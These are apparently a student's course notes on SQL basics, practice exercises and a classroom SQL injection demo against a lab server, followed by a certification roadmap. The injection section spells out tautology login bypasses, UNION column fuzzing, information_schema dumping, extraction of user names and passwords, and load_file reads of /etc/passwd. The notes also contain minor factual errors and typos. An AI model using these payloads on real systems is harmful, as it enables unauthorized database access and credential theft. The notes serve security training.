##### SQL

- SQL = "Standard Query Language"
- SQL is an ANSI standard used for data processing in a database.

### SQL Standard Commands

[SQL Syntax](https://www.w3schools.com/SQl/sql_syntax.asp)

```
USE             select the DB you would like to use.
SELECT          extracts data from a database
UPDATE          updates data in a database
DELETE          deletes data from a database
INSERT INTO     inserts new data into a database
CREATE DATABASE creates a new database
ALTER DATABASE  modifies a database
CREATE TABLE    creates a new table
ALTER TABLE     modifies a table
DROP TABLE      deletes a table
CREATE INDEX    creates an index (search key)
DROP INDEX      deletes an index
UNION           Used to combine the result-set of two or more SELECT statements

```






### SQL Injection - Considerations

- Require Valid SQL Queries
- Fully patched systems can be vulnerable due to misconfiguration
- Input Field Sanitization
- String vs Integer Values
- Is information_schema Database available?
- GET Request versus POST Request HTTP methods


# SQL COMMANDS DEMO

```
Database 	= File | DOD
Table 		= Sheets | USMC, USAF
Column 		= Columns | Rank, Lname, EDIPI

>> mysql				:	starts sql

>> msql --user=root --pass=<password>	:	choose a user/pw

>> show databases ;			:	shows databases available

## the 3 defaullt databases
------------------------------------------------------------------
information_schema	:	database of databases (meta data)
mysql			:	configuration, user information
performance_schema	:	status information	
-------------------------------------------------------------------

>> show tables from <database>		:		shows tables from a given database
>> show tables from session		:		shows tables from 'session' database

## generic SQL statements
-------------------------------------------------------------------
>> select <column> from <database>.<table>
>> select * from session.Tires;
-------------------------------------------------------------------

>> select tireid,name,size from session.Tires;
>> select * from session.car;


## combining statements
-----------------------
1. Nesting Statements
	>> select * form session.car; select * from session.Tires;

2. Joining statements
	'UNION' command
	car table = 4
	Tires = 6
	
	>> select * form session.car UNIONselect * from session.Tires;


	#this would result in 'ERROR: different number of columns'

	 Add or remove rolumns
	 1 | 2 | 3 | 4 | 5 | 6
	 1 | 2 | 3 | 4 | null | null


	1,2,3
	null

	>> select * from session.car UNION select *,1,2 from session.Tires

	>> select * from sesion.car UNION select *,'a','a' from session.Tires

	removing columns
	----------------
		>> select carid,name,type,cost from session.car UNION select * from session.Tires
		
	--------------------------------------------------------------------------------------------
	
	describe <database>.<table>			:	shows expected type of a table
	describe session.car;
	
	carid | name | type | cost | color | year 
	int | varchar | varchar | int | varchar | int
```

### SQLBOLT

[practice website](https://sqlbolt.com/) 1-5 done, do 6-11 and 13 later


```
Exercise 3:
----------------------------------------------------------------------------------------------------------------
1. Find all the Toy Story movies
	>> SELECT title FROM movies WHERE title LIKE "%Toy Story%"
2. Find all the movies directed by John Lasseter
	>> SELECT title FROM movies WHERE director LIKE "John Lasseter"
3. Find all the movies (and director) not directed by John Lasseter
	>> SELECT title FROM movies WHERE director NOT LIKE "John Lasseter"
4. Find all the WALL-* movies
	>> SELECT title FROM movies WHERE title LIKE "%WALL-%"
---------------------------------------------------------------------------------------------------------------

Exercise 4:
1. List all directors of Pixar movies (alphabetically), without duplicates
	>> SELECT DISTINCT director FROM movies ORDER BY director ASC
2. List the last four Pixar movies released (ordered from most recent to least)
	>> SELECT title FROM movies ORDER BY year DESC LIMIT 4
3. List the first five Pixar movies sorted alphabetically
	>> SELECT title FROM movies ORDER BY title ASC LIMIT 5;
4. List the next five Pixar movies sorted alphabetically
	>> SELECT title FROM movies ORDER BY title ASC LIMIT 5 OFFSET 5;
----------------------------------------------------------------------------------------------------------------

Exercise 5:
1. List all the Canadian cities and their populations 
	>> SELECT City,Population from north_american_cities WHERE country LIKE "Canada"
2. Order all the cities in the United States by their latitude from north to south
	>> SELECT City from north_american_cities where country like "United States" order by latitude desc
3. List all the cities west of Chicago, ordered from west to east
	>> SELECT City from north_american_cities where longitude < -87.629798 order by longitude asc
4. List the two largest cities in Mexico (by population)
	>> SELECT City,population from north_american_cities where country like "Mexico" order by population desc limit 2
	
Exercise 6:

```
# SQL Injection Demo

- SQL injection is the use of Valid SQL Queries, via input data fields or attaching of queries to the end of URLs, from the client-side to a server-side application. This allows data to be read or modified. SQL injection relies on unsanitized input fields.

#### Logical Example
```
$name = [ daniel ]
$pass = [ password ] 

SELECt id FROM users WHERE name='$name' and pass='$pass';
SELECt id FROM users WHERE name='daniel' AND pass='password'


$name = [ daniel' or 1='1 ]
$pass = [ password' or 1='1 ]

select id FROM users WHERE name='daniel' or 1='1' AND pass='password' or 1='1';

1=1 True 
```

# Actual Demo
- ip: 10.50.21.144


### SQL Injection - Login - Credentials

#### STEPS: 
- on 10.50.21.144, view page source and examine index.html
- after entering any username and password, open console using f12 and open network tab; note the POST in the console for login.php
- Attempt to use one of the generic truth statements (see below) in the password field with any username: should be successful

##### 1. Determine if the login page (POST method) is vulnerable to SQL injection via Truth statment
- generic truth statements: 
- `<value>' or 1='1`
- `<value>' or 1='1;
- `<value>' or 1='1; #`
- `<value>' or 1='1; --`

	What did we determine?
	1. The 10.50.21.144 is vulnerable to SQL injection
	2. admin is a user

##### 2. Exploit vulnerable login page )GET Method) w/ truth statement

http://10.50.21.144/login.php

What are the query string parameters?
- username
- password

building the query string from searchbar (step by step)

- http://10.50.21.144/login.php
- http://10.50.21.144/login.php?
- http://10.50.21.144/login.php?username
- http://10.50.21.144/login.php?username=
- http://10.50.21.144/login.php?username=dan'
- http://10.50.21.144/login.php?username=dan' or 1='1
- http://10.50.21.144/login.php?username=dan' or 1='1&
- http://10.50.21.144/login.php?username=dan' or 1='1&passwd
- http://10.50.21.144/login.php?username=dan' or 1='1&passwd=

- **http://10.50.21.144/login.php?username=dan' or 1='1&passwd=dan' or 1='1**


### Practice Website (cars SQL)

http://10.50.21.144/Union.html

## SQL Injection - POST Method

#### Steps:
##### 0. Behavior analyis (use the website!)
- Only valid values will display information from the table on a webpage

##### 1. Determine vulernable webpage via truth statement
- generic truth statement (POST)
- `Ford' or 1='1`		#didnt work
- `Ford' or 1='1;`		#didnt work
- `Ford' or 1='1; #`		#didnt work
- `Ford' or 1='1; --`		#didnt work

((for the sake of time, the other variations with the other cars also didnt work. in practice, test these!))

- `Audi' or 1='1; --` 		#WORKED!

##### 2. Determine the number of clomuns that exist on the webpage via fuzzing
- Rows: 5
- Columns: 4 <---- lowest

	**We start with the lowest number and slowly move up higher!!!**
	
- `Audi' or 1='1;`

- `'Audi' UNION select 1,2,3,4`		#nope
- `Audi' UNION select 1,2,3,4;`		#nope
- `Audi' UNION select 1,2,3,4; #`	#nope
- `Audi' UNION select 1,2,3,4; --`	#nope

- `'Audi' UNION select 1,2,3,4,5`	#nope
- `Audi' UNION select 1,2,3,4,5;`	#nope
- `Audi' UNION select 1,2,3,4,5; #`	#WORKS!
- `Audi' UNION select 1,2,3,4,5; --`	#nope

##### 3. Determine the number of columns, the order, and if there are any hidden columns

- Columns: 5
- Display Order: 1,3,4,5
- Hidden: 2 (as in column 2)

##### 4. Dumping/Extracting information via Golden Statement

The golden statement:
- `SELECT table_schema,table_name,column_name FROM information_schema.columns`

information_schema = database, database of databases, provides all information pertaining to database information

information_schema.columns = NOT actually a column! it is a table named 'column'. try not to think too hard

table_schema = column inside the 'columns' table

table_name = column inside the columns table, lits out table names

column_name = column inside the columns table, lists out column names

`Audi' UNION select 1,2,3,4,5;#`
`Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns; #`

1. table_schema 	:	database names
2. 2 = placeholder for hidden '2'
3. table_name
4. column_name
5. 5 = placeholder for '5'


- to get creds? switch it around a bit

##### 5. Extracting desired information

- switch around your golden SQL statement a bit

`Audi' UNION select id,2,name,pass,5 from session.user; #`



## SQL Injection - Webpages - GET METHOD

#### STEPS

##### 0. Behavior analysis
- look at what the website is actually doing ; pay attention to URL changes and what is happening on your screen, play with choices

##### 1. Determine vulnerable webpage via truth statement
- generic truth statement (GET)
- `<value or 1=1`
- `<value or 1=1;`
- `<value or 1=1; #
- `<value or 1=1; --`

- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1
- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1;
- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1; #
- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1; --

- http://10.50.21.144/uniondemo.php?Selection=3 or 1=1
- http://10.50.21.144/uniondemo.php?Selection=3 or 1=1;
- http://10.50.21.144/uniondemo.php?Selection=3 or 1=1; #
- http://10.50.21.144/uniondemo.php?Selection=3 or 1=1; --

- http://10.50.21.144/uniondemo.php?Selection=4 or 1=1
- http://10.50.21.144/uniondemo.php?Selection=4 or 1=1; 
- http://10.50.21.144/uniondemo.php?Selection=4 or 1=1; #
- http://10.50.21.144/uniondemo.php?Selection=4 or 1=1; --


- all of the above work 







###### 2. Determine the number of columns that exist on the table displayed on the webpage via Fuzzing

- rows: 5
- Columns: 3 ((start at lowest))

- http://10.50.21.144/uniondemo.php?Selection=2 or 1=1
- http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,3	#works ((all others work too))

##### 3. Determine the number of columns, the order, and if there are any hidden columns

Columns: 3
Display order: 1,2,3

Backend Order: 1 | 2 | 3
Webpage Order: 1 | 3 | 2

##### 4. Dumping/extracting information via golden statement

- Generic SQL Statement
- `select <column> from <<database>.<table>`

- Generic golden statement
- `select table_schema,table_name,column_name from information_schema.columns`


http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,table_name.column_name from information_schema.columns

- Backend Order:
table_schema | table_name | column_name
----------------------------------------
1	     |      2     |      3


- Webpage Display Order:
table_schema | column name | table_name
----------------------------------------
1             |      3      |     2



- if you wanted to get the following:
1. name,type,year
2. session
3. car

then:
- http://10.50.21.144/uniondemo.php?Selection=2 UNION select name,type,year FROM session.car


#### 5. Extract desired information

##### 5.1 SQL Injection Filtering (WHERE)

http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,coolumn.name,table_name from information_schema.columns where table_schema='session'

- this gets rid of the default schema's from your SQL injection query


##### 5.2 SQL Injection - Functions (LOAD_FILE())
- UNION select 1,2,load_file('/etc/passwd')

/etc/passwd
/etc/group
/etc/networks
/etc/hosts
/etc/resolv.conf

##### 5.3 SQL Injection - SQL Version (@@version)

SELECT 1,2,@@version

> 10.1.48-MariaDB-0Ubuntu0.18.04.1

##### 5.4 SQL Injection Considerations - Escaping Characters

[site](https://dev.mysql.com/doc/refman/8.0/en/string-literals.html)








# CERT ROADMAP (OTHER)
 - CISSP
 - CASP
 - CEH
 - Net+ 
 - Those are the certs that Gunny Nguyen's friend who is a Incident Response Manager at Microsot has
 - SANS courses are 6 day courses, 7-8k dollar certs, very expensive
 - Marine Corps makes bank for certifications ; look into staying in for taking courses and testing
 - Marine Corps COOL program (Credentialin Opportunities On-Line





